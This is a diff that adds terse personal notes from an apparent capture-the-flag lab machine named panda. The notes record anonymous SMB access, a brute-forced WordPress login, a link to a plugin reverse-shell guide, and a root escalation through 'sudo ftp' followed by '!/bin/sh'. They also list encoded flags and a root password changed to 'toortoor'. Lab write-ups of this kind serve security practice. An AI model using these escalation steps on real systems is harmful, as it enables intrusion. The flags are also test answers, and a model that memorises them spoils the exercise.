@@ -1,0 +1,71 @@
+export IP= 10.10.131.68
+
+
+http:/ip/flag/
+
+hex
+base64
+d220a54fb2f0f088e7eb634fadcdd97f
+
+
+
+smbclient //panda.thm/anonymous
+
+get binary
+
+strings binary
+
+6333685ba4ed33ed2a1836ae30c99fd6
+
+
+
+
+wordpress login 
+
+
+
+[!] Valid Combinations Found:
+ | Username: po, Password: password1
+
+
+
+
+ *bit of guidance
+
+ https://www.sevenlayers.com/index.php/179-wordpress-plugin-reverse-shell
+
+
+
+
+[shifu@panda home]$
+
+ sudo ftp
+!/bin/sh
+
+
+
+
+
+/home/po/flag.txt
+MGNlMTZmYjFiYmM1ODY2OTczY2JlZmNlNjY4YTJmYTcK
+
+
+/home/shifu/flag.txt
+YzIzOGI2MzNkNTExOTM3NGYyMmQwNzk4Y2Q5ZDkzOGIK
+
+
+/home/tigress/flag.txt
+Mzk3NGRkYWFmM2RjM2ViOGU0NjZlNWQ2YjMyNDZjNWEK
+										
+
+
+
+
+*change root passwd
+
+toortoor
+
+
+
+*got root ssh
+
